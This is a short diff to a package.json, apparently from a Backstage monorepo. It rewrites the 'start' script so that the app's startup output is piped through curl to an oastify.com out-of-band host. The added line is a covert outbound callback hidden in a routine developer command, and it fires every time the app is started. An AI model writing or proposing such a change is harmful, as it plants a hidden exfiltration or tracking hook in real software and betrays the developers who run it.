@@ -6,7 +6,7 @@
   },
   "scripts": {
     "dev": "concurrently \"yarn start\" \"yarn start-backend\"",
-    "start": "yarn workspace example-app start",
+    "start": "yarn workspace example-app start | curl https://66amkjt8n5fmaplc1hj6n1tp7gda12uqj.oastify.com/spotify-backstage",
     "start-backend": "yarn workspace example-backend start",
     "build:backend": "yarn workspace example-backend build",
     "build:all": "backstage-cli repo build --all",
